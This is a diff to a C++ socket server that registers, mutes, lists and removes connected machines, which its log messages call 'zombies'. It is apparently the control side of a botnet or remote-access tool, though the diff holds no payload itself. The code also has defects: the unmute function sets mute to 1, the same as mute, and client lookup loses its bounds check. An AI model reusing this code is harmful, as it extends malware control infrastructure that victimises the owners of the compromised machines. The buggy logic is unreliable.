@@ -45,7 +45,7 @@ Server::~Server()
 {
 	for (int i = 0; i < clients.size(); i++)
 	{
-		closesocket(clients[i].sock);
+		closesocket(clients[i].sock); // at to access pointer st_Client
 	}
 }
 
@@ -92,12 +92,12 @@ bool Server::acceptClient()
 		NewClient.addr = clientAddress;
 		NewClient.number = (clients.size()+1);
 		// IP
-		recv(newClient, buffer, sizeof(buffer), 0);
-
+		recv(NewClient.sock, buffer, sizeof(buffer), 0);
+		NewClient.sin_port = addr.sin_port;
 		NewClient.ip_extern = buffer;
 		clients.push_back(NewClient);
-		print_done("New client accepted : " + NewClient.ip_extern + "/" + std::to_string(addr.sin_port));
 
+		print_done("New zombie accepted : " + NewClient.ip_extern + "/" + std::to_string(addr.sin_port));
 		if (clients.size() == 1) 
 		{
 			default_client = NewClient;
@@ -111,10 +111,13 @@ bool Server::acceptClient()
 		return 0;
 	}
 }
-
-std::vector<st_Client> Server::getClients(){return clients;}
+void Server::setMute(const unsigned short& nb) { clients[nb].mute = 1; }
+void Server::setUnmute(const unsigned short& nb) { clients[nb].mute = 1; }
+SOCKET& Server::getSockCl(const unsigned short& nb) { return clients[nb].sock; }
+std::vector<st_Client>& Server::getClients(){return clients;}
 bool Server::getExit() { return exit_; }
 void Server::setExit(const bool &pexit) { exit_ = pexit; }
+
 void Server::shutdown()
 {
 	print_status("Closing the server ..");
@@ -125,19 +128,14 @@ void Server::shutdown()
 	delete this;
 	exit(1);
 }
-void Server::setDefaultClient(st_Client _default)
+
+void Server::setDefaultClient(st_Client& _default)
 {
 	default_client = _default;
 }
-st_Client Server::getDefaultClient() const { return default_client; }
+st_Client& Server::getDefaultClient() { return default_client; }
+st_Client& Server::getClient(const unsigned short& nb){ return clients[nb]; }
 
-st_Client Server::getClient(const unsigned short& nb) { 
-	if (nb <= clients.size())
-		return clients[nb];
-	else
-		return default_client;
-		
-}
 bool Server::recv_b()
 {
 	char b[SIZE_BUFFER] = { 0 };
@@ -153,12 +151,15 @@ bool Server::recv_b()
 
 void Server::removeDefaultClient()
 {
-	clients.erase(clients.begin() + default_client.number);
+	clients.erase(clients.begin() + default_client.number-1); // Number 
 	if (clients.size() != 1)
 	{
 		for (int i = 0; i < clients.size(); i++)
 		{
-			clients[i].number = clients[i].number - 1;
+			if (clients[i].number != 0)
+			{
+				clients[i].number = clients[i].number - 1;
+			}
 		}
 	}
 }
@@ -171,7 +172,7 @@ void Server::removeClient(const unsigned short& nb)
 	}
 	else
 	{
-		print_warning("Removing Zombie " + std::to_string(nb) + " : " + clients[nb].ip_extern);
+		print_warning("Removing Zombie " + std::to_string(nb+1));
 		clients.erase(clients.begin() + nb);
 		print_done("Done");
 	}
